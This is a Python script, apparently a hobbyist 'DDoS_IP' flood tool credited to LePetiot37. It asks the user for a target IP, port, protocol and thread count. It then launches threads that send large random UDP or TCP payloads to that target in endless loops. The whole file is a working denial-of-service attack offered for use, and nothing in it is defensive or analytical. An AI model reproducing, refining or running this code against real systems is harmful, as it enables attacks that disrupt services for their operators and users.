#DDos_IP
import socket
import random
import threading
import time
import os
import sys
import struct
import codecs
import urllib.request
import re

os.system("clear")
print("""\033[91m

██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                 
\033[0m""")


#/-----------------------PUBS-----------------------\

print()
print("[" + '\033[1m' + '\033[31m' + "#" + '\033[0m' + "] " + '\033[1m' + '\033[31m' + "Author : LePetiot37" + '\033[0m' + "   Petiot DDoS_IP From - " + '\033[1m' + '\033[31m' + "Petiot HACKER" + '\033[0m')
print()
print("\033[32m================================================================\033[0m")
print("\033[32mTool Created : DDOS_IP \033[0m")
print("\033[33mGithub       : https://github.com/lepetiot37-jpn/DDOS\033[0m")
print("\033[33mYoutube      : https://m.youtube.com/@LePetiot37/\033[0m")
print("\033[32m================================================================\033[0m")
print()
print("\033[92mDDoS_IP Script By LePetiot37\033[0m")

#/-----------------------------------------------------\


#/--------------------Varriable--------------------\

time.sleep(1)
#ip
ip = str(input(" \033[91m[\033[0m\033[92m+\033[0m\033[91m] \033[0mTarget IP : "))
#port
port = int(input(" \033[91m[\033[0m\033[92m+\033[0m\033[91m] \033[0mTarget Port : "))
# choice
choice = str(input(" \033[91m[\033[0m\033[92m+\033[0m\033[91m] \033[0mMethod (UDP/TCP) : "))
#times
times = int(input(" \033[91m[\033[0m\033[92m+\033[0m\033[91m] \033[0mPackets per Connection : "))
#threads
threads = int(input(" \033[91m[\033[0m\033[92m+\033[0m\033[91m] \033[0mNumber of Threads : "))

#/-------------------------------------------------\


#/----------------------While---------------------\

def udp():
    data = random._urandom(65500)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for i in range(times):
                s.sendto(data,addr)
            print(f"\033[92mSent \033[0m{times} \033[92mUDP packets to \033[0m{ip}:\033[0m{port} x{threads}")
        except:
            print("\033[91mError Sending UDP Packets\033[0m")
def tcp():
    data = random._urandom(65500)
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip,port))
            for x in range(times):
                s.send(data)
            print(f"\033[92mSent \033[0m{times} \033[92mTCP packets to \033[0m{ip}:\033[0m{port}")
        except:
            s.close()
            print("\033[91mError Sending TCP Packets\033[0m")
for y in range(threads):
    if choice == 'UDP' or choice == '1':
        th = threading.Thread(target = udp)
        th.start()
    elif choice == 'TCP' or choice == '2':
        th = threading.Thread(target = tcp)
        th.start()
    else:
        print("\033[91mInvalid Method! Choose UDP or TCP\033[0m")
        break

#/------------------------------------------------\

def DDoS_IP():
    pass
    return None

if __name__ == "__main__":
    DDoS_IP()
